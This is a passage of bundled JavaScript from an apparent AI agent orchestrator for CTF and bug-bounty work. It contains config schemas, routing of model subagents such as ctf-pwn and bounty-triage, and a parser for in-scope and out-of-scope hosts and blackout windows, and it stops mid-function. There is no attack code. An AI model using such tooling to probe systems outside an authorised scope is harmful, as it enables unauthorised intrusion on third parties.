  activate_targets: exports_external.array(exports_external.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])).default([
    "REV",
    "CRYPTO"
  ]),
  activate_on_stuck: exports_external.boolean().default(true),
  disable_with_thinking_model: exports_external.boolean().default(true),
  tool_name: exports_external.string().min(1).default("aegis_think")
}).default({
  enabled: true,
  activate_phases: ["PLAN", "VERIFY"],
  activate_targets: ["REV", "CRYPTO"],
  activate_on_stuck: true,
  disable_with_thinking_model: true,
  tool_name: "aegis_think"
});
var TuiNotificationsSchema = exports_external.object({
  enabled: exports_external.boolean().default(false),
  throttle_ms: exports_external.number().int().nonnegative().default(5000),
  startup_toast: exports_external.boolean().default(true),
  startup_terminal_banner: exports_external.boolean().default(false)
}).default({
  enabled: false,
  throttle_ms: 5000,
  startup_toast: true,
  startup_terminal_banner: false
});
var TargetRouteMapSchema = exports_external.object({
  WEB_API: exports_external.string().min(1),
  WEB3: exports_external.string().min(1),
  PWN: exports_external.string().min(1),
  REV: exports_external.string().min(1),
  CRYPTO: exports_external.string().min(1),
  FORENSICS: exports_external.string().min(1),
  MISC: exports_external.string().min(1),
  UNKNOWN: exports_external.string().min(1)
});
var DomainRoutingSchema = exports_external.object({
  scan: TargetRouteMapSchema,
  plan: TargetRouteMapSchema,
  execute: TargetRouteMapSchema,
  stuck: TargetRouteMapSchema,
  failover: TargetRouteMapSchema
});
var RoutingSchema = exports_external.object({
  ctf: DomainRoutingSchema.default(DEFAULT_ROUTING.ctf),
  bounty: DomainRoutingSchema.default(DEFAULT_ROUTING.bounty)
});
var CapabilityProfileSchema = exports_external.object({
  required_subagents: exports_external.array(exports_external.string()).default([])
});
var TargetCapabilitySchema = exports_external.object({
  WEB_API: CapabilityProfileSchema,
  WEB3: CapabilityProfileSchema,
  PWN: CapabilityProfileSchema,
  REV: CapabilityProfileSchema,
  CRYPTO: CapabilityProfileSchema,
  FORENSICS: CapabilityProfileSchema,
  MISC: CapabilityProfileSchema,
  UNKNOWN: CapabilityProfileSchema
});
var CapabilityProfilesSchema = exports_external.object({
  ctf: TargetCapabilitySchema.default(DEFAULT_CAPABILITY_PROFILES.ctf),
  bounty: TargetCapabilitySchema.default(DEFAULT_CAPABILITY_PROFILES.bounty)
});
var AutoTriageSchema = exports_external.object({
  enabled: exports_external.boolean().default(true)
}).default({ enabled: true });
var FlagDetectorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  custom_patterns: exports_external.array(exports_external.string()).default([])
}).default({ enabled: true, custom_patterns: [] });
var PatternMatcherSchema = exports_external.object({
  enabled: exports_external.boolean().default(true)
}).default({ enabled: true });
var ReconPipelineSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_commands_per_phase: exports_external.number().int().positive().default(10)
}).default({ enabled: true, max_commands_per_phase: 10 });
var DeltaScanSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_age_ms: exports_external.number().int().positive().default(24 * 60 * 60 * 1000)
}).default({ enabled: true, max_age_ms: 86400000 });
var ReportGeneratorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true)
}).default({ enabled: true });
var AutoPhaseSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  scan_to_plan_tool_count: exports_external.number().int().positive().default(8),
  plan_to_execute_on_todo: exports_external.boolean().default(true)
}).default({ enabled: true, scan_to_plan_tool_count: 8, plan_to_execute_on_todo: true });
var DebugSchema = exports_external.object({
  log_all_hooks: exports_external.boolean().default(false),
  log_tool_call_counts: exports_external.boolean().default(true)
}).default({ log_all_hooks: false, log_tool_call_counts: true });
var OrchestratorConfigSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  enable_builtin_mcps: exports_external.boolean().default(true),
  google_auth: exports_external.boolean().optional(),
  disabled_mcps: exports_external.array(AnyMcpNameSchema).default([]),
  strict_readiness: exports_external.boolean().default(true),
  enable_injection_logging: exports_external.boolean().default(true),
  enforce_todo_single_in_progress: exports_external.boolean().default(true),
  enforce_todo_flow_non_scan: exports_external.boolean().default(true),
  enforce_todo_granularity_non_scan: exports_external.boolean().default(true),
  todo_min_items_non_scan: exports_external.number().int().min(1).default(2),
  parallel: ParallelSchema,
  tool_output_truncator: ToolOutputTruncatorSchema,
  context_injection: ContextInjectionSchema,
  auto_loop: AutoLoopSchema,
  target_detection: TargetDetectionSchema,
  notes: NotesSchema,
  comment_checker: CommentCheckerSchema,
  rules_injector: RulesInjectorSchema,
  recovery: RecoverySchema,
  interactive: InteractiveSchema,
  tui_notifications: TuiNotificationsSchema,
  memory: MemorySchema,
  sequential_thinking: SequentialThinkingSchema,
  ctf_fast_verify: exports_external.object({
    enabled: exports_external.boolean().default(true),
    enforce_all_targets: exports_external.boolean().default(false),
    risky_targets: exports_external.array(exports_external.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])).default([
      "PWN",
      "REV",
      "CRYPTO"
    ]),
    require_nonempty_candidate: exports_external.boolean().default(true)
  }).default({
    enabled: true,
    enforce_all_targets: false,
    risky_targets: ["PWN", "REV", "CRYPTO"],
    require_nonempty_candidate: true
  }),
  default_mode: exports_external.enum(["CTF", "BOUNTY"]).default("BOUNTY"),
  enforce_mode_header: exports_external.boolean().default(false),
  allow_free_text_signals: exports_external.boolean().default(false),
  stuck_threshold: exports_external.number().int().positive().default(2),
  guardrails: GuardrailsSchema.default(GuardrailsSchema.parse({})),
  bounty_policy: BountyPolicySchema.default(BountyPolicySchema.parse({})),
  verification: VerificationSchema.default(VerificationSchema.parse({})),
  markdown_budget: MarkdownBudgetSchema.default(MarkdownBudgetSchema.parse({})),
  failover: FailoverSchema.default(FailoverSchema.parse({})),
  dynamic_model: DynamicModelSchema.default(DynamicModelSchema.parse({})),
  auto_dispatch: AutoDispatchSchema.default(AutoDispatchSchema.parse({})),
  routing: RoutingSchema.default(DEFAULT_ROUTING),
  capability_profiles: CapabilityProfilesSchema.default(DEFAULT_CAPABILITY_PROFILES),
  skill_autoload: SkillAutoloadSchema,
  auto_triage: AutoTriageSchema,
  flag_detector: FlagDetectorSchema,
  pattern_matcher: PatternMatcherSchema,
  recon_pipeline: ReconPipelineSchema,
  delta_scan: DeltaScanSchema,
  report_generator: ReportGeneratorSchema,
  auto_phase: AutoPhaseSchema,
  debug: DebugSchema
});

// src/utils/json.ts
function stripJsonComments(raw) {
  let out = "";
  let inString = false;
  let isEscaped = false;
  let inLineComment = false;
  let inBlockComment = false;
  for (let i = 0;i < raw.length; i += 1) {
    const ch = raw[i];
    const next = i + 1 < raw.length ? raw[i + 1] : "";
    if (inLineComment) {
      if (ch === `
`) {
        inLineComment = false;
        out += ch;
      }
      continue;
    }
    if (inBlockComment) {
      if (ch === "*" && next === "/") {
        inBlockComment = false;
        i += 1;
      }
      continue;
    }
    if (inString) {
      out += ch;
      if (isEscaped) {
        isEscaped = false;
        continue;
      }
      if (ch === "\\") {
        isEscaped = true;
        continue;
      }
      if (ch === '"') {
        inString = false;
      }
      continue;
    }
    if (ch === '"') {
      inString = true;
      out += ch;
      continue;
    }
    if (ch === "/" && next === "/") {
      inLineComment = true;
      i += 1;
      continue;
    }
    if (ch === "/" && next === "*") {
      inBlockComment = true;
      i += 1;
      continue;
    }
    out += ch;
  }
  return out;
}
function safeJsonParse(raw) {
  try {
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

// src/utils/is-record.ts
function isRecord(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}

// src/config/loader.ts
function deepMerge(a, b) {
  const left = isRecord(a) ? a : {};
  const right = isRecord(b) ? b : {};
  const out = { ...left };
  for (const [key, value] of Object.entries(right)) {
    const existing = out[key];
    if (isRecord(existing) && isRecord(value)) {
      out[key] = deepMerge(existing, value);
      continue;
    }
    out[key] = value;
  }
  return out;
}
function readJSON(path, onWarning) {
  if (!existsSync(path)) {
    return {};
  }
  try {
    const raw = readFileSync(path, "utf-8");
    const stripped = stripJsonComments(raw);
    return JSON.parse(stripped);
  } catch (error48) {
    const message = error48 instanceof Error ? error48.message : String(error48);
    if (onWarning) {
      onWarning(`Failed to parse config JSON: ${path} (${message})`);
    }
    return {};
  }
}
function resolveConfigPath(candidate) {
  if (existsSync(candidate)) {
    return candidate;
  }
  if (candidate.toLowerCase().endsWith(".json")) {
    const jsonc = `${candidate.slice(0, -5)}.jsonc`;
    if (existsSync(jsonc)) {
      return jsonc;
    }
  }
  return candidate;
}
function loadConfig(projectDir, options) {
  const projectPath = resolveConfigPath(join(projectDir, ".Aegis", "oh-my-Aegis.json"));
  const userCandidates = [];
  const xdg = process.env.XDG_CONFIG_HOME;
  const home = process.env.HOME;
  const appData = process.env.APPDATA;
  const warn = options?.onWarning;
  if (xdg) {
    userCandidates.push(resolveConfigPath(join(xdg, "opencode", "oh-my-Aegis.json")));
  }
  if (home) {
    userCandidates.push(resolveConfigPath(join(home, ".config", "opencode", "oh-my-Aegis.json")));
  }
  if (process.platform === "win32" && appData) {
    userCandidates.push(resolveConfigPath(join(appData, "opencode", "oh-my-Aegis.json")));
  }
  let userConfig = {};
  for (const candidate of userCandidates) {
    if (existsSync(candidate)) {
      userConfig = readJSON(candidate, warn);
      break;
    }
  }
  const projectConfig = readJSON(projectPath, warn);
  const merged = deepMerge(userConfig, projectConfig);
  const parsed = OrchestratorConfigSchema.safeParse(merged);
  if (parsed.success) {
    return parsed.data;
  }
  if (warn) {
    warn(`Config schema validation failed; falling back to defaults (issues=${parsed.error.issues.length}).`);
  }
  return OrchestratorConfigSchema.parse({});
}

// src/config/readiness.ts
import { existsSync as existsSync3, readFileSync as readFileSync3 } from "fs";
import { join as join4 } from "path";

// src/install/agent-overrides.ts
var AGENT_OVERRIDES = {
  "aegis-plan": { model: "opencode/glm-5-free" },
  "aegis-exec": { model: "openai/gpt-5.3-codex", variant: "high" },
  "aegis-deep": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-web": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-web3": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-pwn": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-rev": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-crypto": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-forensics": { model: "opencode/glm-5-free" },
  "ctf-explore": { model: "opencode/glm-5-free" },
  "ctf-solve": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-research": { model: "opencode/glm-5-free" },
  "ctf-hypothesis": { model: "opencode/glm-5-free" },
  "ctf-decoy-check": { model: "opencode/glm-5-free" },
  "ctf-verify": { model: "openai/gpt-5.3-codex", variant: "medium" },
  "bounty-scope": { model: "openai/gpt-5.3-codex", variant: "medium" },
  "bounty-triage": { model: "openai/gpt-5.3-codex", variant: "high" },
  "bounty-research": { model: "opencode/glm-5-free" },
  "deep-plan": { model: "opencode/glm-5-free" },
  "md-scribe": { model: "opencode/glm-5-free" },
  "explore-fallback": { model: "opencode/glm-5-free" },
  "librarian-fallback": { model: "opencode/glm-5-free" },
  "oracle-fallback": { model: "opencode/glm-5-free" }
};

// src/orchestration/model-health.ts
var VARIANT_SEP = "--";
var MODEL_SHORT = {
  "openai/gpt-5.3-codex": "codex",
  "opencode/glm-5-free": "glm",
  "opencode/minimax-2.5-free": "minimax",
  "anthropic/claude-sonnet-4.5": "claude",
  "anthropic/claude-opus-4.1": "opus"
};
var SHORT_TO_MODEL = {};
for (const [full, short] of Object.entries(MODEL_SHORT)) {
  SHORT_TO_MODEL[short] = full;
}
var DEFAULT_AGENT_MODEL = "openai/gpt-5.3-codex";
var DEFAULT_AGENT_VARIANT = "medium";
var MODEL_VARIANTS = {
  "openai/gpt-5.3-codex": ["low", "medium", "high", "xhigh"],
  "anthropic/claude-sonnet-4.5": ["low", "max"],
  "anthropic/claude-opus-4.1": ["low", "max"]
};
var MODELS_WITHOUT_VARIANT = new Set([
  "opencode/glm-5-free",
  "opencode/minimax-2.5-free"
]);
var MODEL_DEFAULT_VARIANT = {
  "openai/gpt-5.3-codex": "medium",
  "anthropic/claude-sonnet-4.5": "low",
  "anthropic/claude-opus-4.1": "low"
};
var NO_VARIANT_AGENTS = new Set([
  "explore-fallback",
  "librarian-fallback",
  "oracle-fallback"
]);
var DEFAULT_COOLDOWN_MS = 300000;
var MODEL_ALTERNATIVES = {
  "openai/gpt-5.3-codex": [
    "opencode/glm-5-free",
    "opencode/minimax-2.5-free",
    "anthropic/claude-sonnet-4.5"
  ],
  "opencode/glm-5-free": [
    "opencode/minimax-2.5-free",
    "openai/gpt-5.3-codex",
    "anthropic/claude-sonnet-4.5"
  ],
  "opencode/minimax-2.5-free": [
    "opencode/glm-5-free",
    "openai/gpt-5.3-codex",
    "anthropic/claude-sonnet-4.5"
  ],
  "anthropic/claude-sonnet-4.5": [
    "openai/gpt-5.3-codex",
    "opencode/glm-5-free",
    "opencode/minimax-2.5-free"
  ],
  "anthropic/claude-opus-4.1": [
    "openai/gpt-5.3-codex",
    "opencode/glm-5-free",
    "opencode/minimax-2.5-free"
  ]
};
function agentModel(agentName) {
  const idx = agentName.indexOf(VARIANT_SEP);
  if (idx !== -1) {
    const short = agentName.slice(idx + VARIANT_SEP.length);
    const model = SHORT_TO_MODEL[short];
    if (model) {
      return model;
    }
  }
  const base = baseAgentName(agentName);
  const override = AGENT_OVERRIDES[base];
  if (override) {
    return override.model;
  }
  return;
}
function modelAlternatives(model) {
  return MODEL_ALTERNATIVES[model] ?? [];
}
function isKnownModelId(model) {
  return Object.prototype.hasOwnProperty.call(MODEL_SHORT, model);
}
function variantAgentName(baseAgent, model) {
  const short = MODEL_SHORT[model];
  if (!short) {
    return baseAgent;
  }
  return `${baseAgent}${VARIANT_SEP}${short}`;
}
function baseAgentName(agentName) {
  const idx = agentName.indexOf(VARIANT_SEP);
  if (idx === -1) {
    return agentName;
  }
  return agentName.slice(0, idx);
}
function isModelHealthy(state, model, cooldownMs = DEFAULT_COOLDOWN_MS) {
  const entry = state.modelHealthByModel[model];
  if (!entry) {
    return true;
  }
  return Date.now() - entry.unhealthySince >= cooldownMs;
}
function resolveHealthyModel(baseAgent, state, cooldownMs = DEFAULT_COOLDOWN_MS) {
  if (NO_VARIANT_AGENTS.has(baseAgent)) {
    return agentModel(baseAgent);
  }
  const primaryModel = agentModel(baseAgent);
  if (!primaryModel) {
    return;
  }
  if (isModelHealthy(state, primaryModel, cooldownMs)) {
    return primaryModel;
  }
  const alts = modelAlternatives(primaryModel);
  for (const alt of alts) {
    if (isModelHealthy(state, alt, cooldownMs)) {
      return alt;
    }
  }
  return primaryModel;
}
function shouldGenerateVariants(agentName) {
  return !NO_VARIANT_AGENTS.has(agentName) && !agentName.includes(VARIANT_SEP);
}
function providerIdFromModel(model) {
  const trimmed = model.trim();
  const idx = trimmed.indexOf("/");
  if (idx === -1)
    return trimmed;
  return trimmed.slice(0, idx);
}
function mapVariantAlias(model, variant) {
  const provider = providerIdFromModel(model);
  const normalized = variant.trim().toLowerCase();
  if (!normalized)
    return null;
  if (provider === "openai") {
    if (normalized === "max")
      return "xhigh";
    if (normalized === "minimal")
      return "low";
    if (normalized === "none")
      return "low";
    return normalized;
  }
  if (provider === "google") {
    if (normalized === "xhigh")
      return "high";
    if (normalized === "max")
      return "high";
    if (normalized === "none")
      return "low";
    return normalized;
  }
  if (provider === "anthropic") {
    if (normalized === "high" || normalized === "xhigh" || normalized === "medium")
      return "max";
    if (normalized === "minimal" || normalized === "none")
      return "low";
    return normalized;
  }
  return normalized;
}
function supportedVariantsForModel(model) {
  return MODEL_VARIANTS[model] ?? [];
}
function defaultVariantForModel(model) {
  if (MODELS_WITHOUT_VARIANT.has(model) || providerIdFromModel(model) === "google") {
    return "";
  }
  return MODEL_DEFAULT_VARIANT[model] ?? DEFAULT_AGENT_VARIANT;
}
function isVariantSupportedForModel(model, variant) {
  if (MODELS_WITHOUT_VARIANT.has(model) || providerIdFromModel(model) === "google") {
    return variant.trim().length === 0;
  }
  const allowed = supportedVariantsForModel(model);
  if (allowed.length === 0) {
    return true;
  }
  return allowed.includes(variant.trim());
}
function normalizeVariantForModel(model, requestedVariant, fallbackVariant = "") {
  if (MODELS_WITHOUT_VARIANT.has(model)) {
    return "";
  }
  const provider = providerIdFromModel(model);
  const allowed = supportedVariantsForModel(model);
  const requested = requestedVariant.trim();
  const fallback = fallbackVariant.trim();
  if (provider === "google" && allowed.length === 0) {
    return "";
  }
  if (allowed.length === 0) {
    if (requested)
      return requested;
    if (fallback)
      return fallback;
    return defaultVariantForModel(model);
  }
  if (requested && allowed.includes(requested)) {
    return requested;
  }
  const mappedRequested = requested ? mapVariantAlias(model, requested) : null;
  if (mappedRequested && allowed.includes(mappedRequested)) {
    return mappedRequested;
  }
  if (fallback && allowed.includes(fallback)) {
    return fallback;
  }
  const mappedFallback = fallback ? mapVariantAlias(model, fallback) : null;
  if (mappedFallback && allowed.includes(mappedFallback)) {
    return mappedFallback;
  }
  return defaultVariantForModel(model);
}
function resolveAgentExecutionProfile(agentName, options) {
  const baseAgent = baseAgentName(agentName);
  const baseProfile = AGENT_OVERRIDES[baseAgent] ?? {
    model: DEFAULT_AGENT_MODEL,
    variant: DEFAULT_AGENT_VARIANT
  };
  const suffixIndex = agentName.indexOf(VARIANT_SEP);
  const legacyModel = suffixIndex !== -1 ? SHORT_TO_MODEL[agentName.slice(suffixIndex + VARIANT_SEP.length)] : undefined;
  const seedModel = legacyModel ?? baseProfile.model;
  const model = options?.preferredModel && options.preferredModel.trim().length > 0 ? options.preferredModel.trim() : seedModel;
  const variant = normalizeVariantForModel(model, options?.preferredVariant ?? "", baseProfile.variant);
  return {
    baseAgent,
    model,
    variant
  };
}

// src/orchestration/task-dispatch.ts
var NON_OVERRIDABLE_ROUTE_AGENTS = new Set([
  "ctf-verify",
  "ctf-decoy-check",
  "bounty-scope",
  "md-scribe"
]);
function isNonOverridableSubagent(name) {
  if (!name) {
    return false;
  }
  return NON_OVERRIDABLE_ROUTE_AGENTS.has(baseAgentName(name));
}
var ROUTE_AGENT_MAP = {
  "aegis-plan": "aegis-plan",
  "aegis-exec": "aegis-exec",
  "aegis-deep": "aegis-deep",
  "bounty-scope": "bounty-scope",
  "ctf-web": "ctf-web",
  "ctf-web3": "ctf-web3",
  "ctf-pwn": "ctf-pwn",
  "ctf-rev": "ctf-rev",
  "ctf-crypto": "ctf-crypto",
  "ctf-forensics": "ctf-forensics",
  "ctf-explore": "ctf-explore",
  "ctf-solve": "ctf-solve",
  "ctf-research": "ctf-research",
  "ctf-hypothesis": "ctf-hypothesis",
  "ctf-decoy-check": "ctf-decoy-check",
  "ctf-verify": "ctf-verify",
  "bounty-triage": "bounty-triage",
  "bounty-research": "bounty-research",
  "deep-plan": "deep-plan",
  "md-scribe": "md-scribe",
  "aegis-explore": "aegis-explore",
  "aegis-librarian": "aegis-librarian"
};
function currentRouting(config2) {
  return config2?.routing ?? DEFAULT_ROUTING;
}
function requiredDispatchSubagents(config2) {
  const routing = currentRouting(config2);
  const required2 = new Set(Object.values(ROUTE_AGENT_MAP));
  for (const domain2 of [routing.ctf, routing.bounty]) {
    for (const phase of [domain2.scan, domain2.plan, domain2.execute, domain2.stuck, domain2.failover]) {
      for (const routeName of Object.values(phase)) {
        required2.add(ROUTE_AGENT_MAP[routeName] ?? routeName);
      }
    }
  }
  return [...required2];
}
function fallbackFor(mode, targetType, config2) {
  const routing = currentRouting(config2);
  if (mode === "CTF") {
    return routing.ctf.failover[targetType];
  }
  return routing.bounty.failover[targetType];
}
function dispatchScore(state, subagentType) {
  const health = state.dispatchHealthBySubagent[subagentType];
  if (!health) {
    return 0;
  }
  return health.successCount * 2 - health.retryableFailureCount - health.hardFailureCount * 2 - health.consecutiveFailureCount * 3;
}
function capabilityCandidates(state, config2) {
  if (!config2) {
    return [];
  }
  const profile = state.mode === "CTF" ? config2.capability_profiles.ctf[state.targetType] : config2.capability_profiles.bounty[state.targetType];
  return profile.required_subagents;
}
function chooseOperationalSubagent(routePrimary, state, mappedSubagent, config2) {
  const threshold = config2?.auto_dispatch.operational_feedback_consecutive_failures ?? 2;
  const mappedHealth = state.dispatchHealthBySubagent[mappedSubagent];
  if (!mappedHealth || mappedHealth.consecutiveFailureCount < threshold) {
    return {
      subagent_type: mappedSubagent,
      reason: `route '${routePrimary}' mapped to subagent '${mappedSubagent}'`
    };
  }
  const pool = [];
  const pushUnique = (value) => {
    if (value && !pool.includes(value)) {
      pool.push(value);
    }
  };
  pushUnique(mappedSubagent);
  pushUnique(fallbackFor(state.mode, state.targetType, config2));
  for (const candidate of capabilityCandidates(state, config2)) {
    pushUnique(candidate);
  }
  let best = mappedSubagent;
  let bestScore = dispatchScore(state, mappedSubagent);
  for (const candidate of pool) {
    if (candidate === mappedSubagent) {
      continue;
    }
    const score = dispatchScore(state, candidate);
    if (score > bestScore) {
      best = candidate;
      bestScore = score;
    }
  }
  if (best === mappedSubagent) {
    return {
      subagent_type: mappedSubagent,
      reason: `mapped subagent '${mappedSubagent}' retained despite failure streak (${mappedHealth.consecutiveFailureCount}).`
    };
  }
  return {
    subagent_type: best,
    reason: `operational feedback switched '${mappedSubagent}' -> '${best}' after ${mappedHealth.consecutiveFailureCount} consecutive failures`
  };
}
function decideAutoDispatch(routePrimary, state, maxFailoverRetries, config2) {
  const dynamicModelEnabled = Boolean(config2?.dynamic_model?.enabled && config2?.dynamic_model?.generate_variants);
  const modelCooldownMs = config2?.dynamic_model?.health_cooldown_ms ?? 300000;
  const maybeApplyModelFailover = (decision) => {
    if (!dynamicModelEnabled || !decision.subagent_type) {
      return decision;
    }
    if (isNonOverridableSubagent(decision.subagent_type)) {
      return decision;
    }
    const primaryModel = agentModel(decision.subagent_type);
    if (!primaryModel) {
      return decision;
    }
    const resolvedModel = resolveHealthyModel(decision.subagent_type, state, modelCooldownMs);
    if (!resolvedModel || resolvedModel === primaryModel) {
      return decision;
    }
    return {
      ...decision,
      model: resolvedModel,
      reason: `${decision.reason}; model-failover '${primaryModel}' -> '${resolvedModel}'`
    };
  };
  if (state.pendingTaskFailover && state.taskFailoverCount < maxFailoverRetries) {
    const fallback = fallbackFor(state.mode, state.targetType, config2);
    return maybeApplyModelFailover({
      subagent_type: fallback,
      reason: `pending failover retry (${state.taskFailoverCount + 1}/${maxFailoverRetries}) after tool failure`
    });
  }
  const mapped = ROUTE_AGENT_MAP[routePrimary] ?? routePrimary;
  if (!mapped) {
    return {
      reason: "no route-agent mapping found"
    };
  }
  if (isNonOverridableSubagent(mapped)) {
    return {
      subagent_type: mapped,
      reason: `route '${routePrimary}' is non-overridable and pinned to '${mapped}'`
    };
  }
  const baseDecision = !config2?.auto_dispatch.operational_feedback_enabled ? { subagent_type: mapped, reason: `route '${routePrimary}' mapped to subagent '${mapped}'` } : chooseOperationalSubagent(routePrimary, state, mapped, config2);
  return maybeApplyModelFailover(baseDecision);
}

// src/bounty/scope-policy.ts
import { existsSync as existsSync2, readFileSync as readFileSync2, statSync } from "fs";
import { join as join2 } from "path";
var DEFAULT_CANDIDATES = [
  ".Aegis/scope.md",
  ".opencode/bounty-scope.md",
  "BOUNTY_SCOPE.md",
  "SCOPE.md"
];
function normalizeHost(host) {
  return host.trim().toLowerCase().replace(/\.+$/, "");
}
function parseHostToken(token) {
  const raw = token.trim();
  if (!raw)
    return null;
  const withoutPunct = raw.replace(/^[`'"\[\(\{<]+|[`'"\]\)\}>.,;:]+$/g, "");
  if (!withoutPunct)
    return null;
  if (/^https?:\/\//i.test(withoutPunct)) {
    try {
      const u = new URL(withoutPunct);
      const h = normalizeHost(u.hostname);
      if (!h)
        return null;
      return { kind: "exact", host: h };
    } catch {
      return null;
    }
  }
  const wildcard = withoutPunct.match(/^\*\.(.+)$/);
  if (wildcard) {
    const suffix = normalizeHost(wildcard[1]);
    if (!suffix)
      return null;
    return { kind: "suffix", suffix };
  }
  const hostLike = withoutPunct.match(/^[a-z0-9-]+(\.[a-z0-9-]+)+$/i);
  if (!hostLike)
    return null;
  const host = normalizeHost(withoutPunct);
  return host ? { kind: "exact", host } : null;
}
function parseDayToIndex(text) {
  const t = text.trim();
  if (t.includes("\uC77C"))
    return 0;
  if (t.includes("\uC6D4"))
    return 1;
  if (t.includes("\uD654"))
    return 2;
  if (t.includes("\uC218"))
    return 3;
  if (t.includes("\uBAA9"))
    return 4;
  if (t.includes("\uAE08"))
    return 5;
  if (t.includes("\uD1A0"))
    return 6;
  if (/\bsun(day)?\b/i.test(t))
    return 0;
  if (/\bmon(day)?\b/i.test(t))
    return 1;
  if (/\btue(s|sday)?\b/i.test(t))
    return 2;
  if (/\bwed(nesday)?\b/i.test(t))
    return 3;
  if (/\bthu(r|rs|rsday)?\b/i.test(t))
    return 4;
  if (/\bfri(day)?\b/i.test(t))
    return 5;
  if (/\bsat(urday)?\b/i.test(t))
    return 6;
  return null;
}
function parseTimeToMinutes(hhmm) {
  const m = hhmm.trim().match(/^(\d{1,2}):(\d{2})$/);
  if (!m)
    return null;
  const hh = Number(m[1]);
  const mm = Number(m[2]);
  if (!Number.isFinite(hh) || !Number.isFinite(mm))
    return null;
  if (hh < 0 || hh > 23 || mm < 0 || mm > 59)
    return null;
  return hh * 60 + mm;
}
function parseBlackoutWindows(lines) {
  const windows = [];
  const warnings = [];
  const re = /(\uC6D4|\uD654|\uC218|\uBAA9|\uAE08|\uD1A0|\uC77C|mon(?:day)?|tue(?:s|sday)?|wed(?:nesday)?|thu(?:r|rs|rsday)?|fri(?:day)?|sat(?:urday)?|sun(?:day)?)\s*\uC694\uC77C?\s*(\d{1,2}:\d{2})\s*[~\-]\s*(\d{1,2}:\d{2})/gi;
  for (const line of lines) {
    const matches = [...line.matchAll(re)];
    for (const match of matches) {
      const day = parseDayToIndex(match[1] ?? "");
      const start = parseTimeToMinutes(match[2] ?? "");
      const end = parseTimeToMinutes(match[3] ?? "");
      if (day === null || start === null || end === null) {
        warnings.push(`failed_to_parse_blackout: ${line.trim()}`);
        continue;
      }
      if (end >= start) {
        windows.push({ day, startMinutes: start, endMinutes: end });
        continue;
      }
      windows.push({ day, startMinutes: start, endMinutes: 1439 });
      windows.push({ day: (day + 1) % 7, startMinutes: 0, endMinutes: end });
    }
  }
  return { windows, warnings };
}
function classifySection(line) {
  if (/(\uBC94\uC704\s*\uB0B4|\uD5C8\uC6A9|\uD14C\uC2A4\uD2B8\s*\uAC00\uB2A5|in\s*-?\s*scope|scope\s*in|eligible|authorized)/i.test(line)) {
    return "allow";
  }
  if (/(\uBC94\uC704\s*\uC678|\uBE44\uB300\uC0C1|\uC81C\uC678|\uAE08\uC9C0|out\s*-?\s*of\s*-?\s*scope|scope\s*out|exclude|excluded|prohibited|forbidden)/i.test(line)) {
    return "deny";
  }
  return "unknown";
}
function dedupeSorted(list) {
  const out = [...new Set(list.filter(Boolean))];
  out.sort();
  return out;
}
function parseScopeMarkdown(markdown, sourcePath, mtimeMs, options) {
  const includeApexForWildcardAllow = options?.includeApexForWildcardAllow === true;
  const warnings = [];
  const lines = markdown.split(/\r?\n/);
  const { windows, warnings: blackoutWarnings } = parseBlackoutWindows(lines);
  warnings.push(...blackoutWarnings);
  const allowedHostsExact = [];
  const allowedHostsSuffix = [];
  const deniedHostsExact = [];
  const deniedHostsSuffix = [];
  let mode = "unknown";
  for (const line of lines) {
    const section = classifySection(line);
    if (section !== "unknown") {
      mode = section;
    }
    const tokens = line.split(/[\s|`]+/).map((t) => t.trim()).filter(Boolean);
    for (const token of tokens) {
      const parsed = parseHostToken(token);
      if (!parsed)
        continue;
      if (mode === "unknown") {
        continue;
      }
      const target = mode;
      if (parsed.kind === "exact") {
        if (target === "deny")
          deniedHostsExact.push(parsed.host);
        else
          allowedHostsExact.push(parsed.host);
      } else {
        if (target === "deny")
          deniedHostsSuffix.push(parsed.suffix);
        else {
          allowedHostsSuffix.push(parsed.suffix);
          if (includeApexForWildcardAllow) {
            allowedHostsExact.push(parsed.suffix);
          }
        }
      }
    }
  }
  for (const line of lines) {
    const m = line.match(/\uAE30\uC900\s*\uB3C4\uBA54\uC778\s*:\s*([a-z0-9.-]+)\b/i);
    if (m) {
      const h = normalizeHost(m[1] ?? "");
      if (h) {
        allowedHostsExact.push(h);
      }
    }
  }
  return {
    sourcePath,
    sourceMtimeMs: mtimeMs,
    allowedHostsExact: dedupeSorted(allowedHostsExact),
    allowedHostsSuffix: dedupeSorted(allowedHostsSuffix),
    deniedHostsExact: dedupeSorted(deniedHostsExact),
    deniedHostsSuffix: dedupeSorted(deniedHostsSuffix),
    blackoutWindows: windows,
    warnings: dedupeSorted(warnings)
  };
}
function resolveScopeDocCandidates(projectDir, config2) {
  const candidates = config2?.candidates?.length ? config2.candidates : [...DEFAULT_CANDIDATES];
  return candidates.map((p) => join2(projectDir, p));
}
function loadScopePolicyFromWorkspace(projectDir, config2) {
  const warnings = [];
  const candidates = resolveScopeDocCandidates(projectDir, config2);
  let path = null;
  for (const candidate of candidates) {
    if (existsSync2(candidate)) {
      path = candidate;
      break;
    }
  }
  if (!path) {
    return {
      ok: false,
      reason: `No scope document found. Looked for: ${candidates.map((c) => c.replace(projectDir + "/", "")).join(", ")}`,
      warnings
    };
  }
  let raw;
  let mtimeMs = 0;
  try {
    raw = readFileSync2(path, "utf-8");
    mtimeMs = statSync(path).mtimeMs;
  } catch (error48) {
    const message = error48 instanceof Error ? error48.message : String(error48);
    return { ok: false, reason: `Failed to read scope document '${path}': ${message}`, warnings };
  }
  const policy = parseScopeMarkdown(raw, path, mtimeMs, {
    includeApexForWildcardAllow: config2?.includeApexForWildcardAllow === true
  });
  return { ok: true, policy };
}
function hostMatchesPolicy(host, policy) {
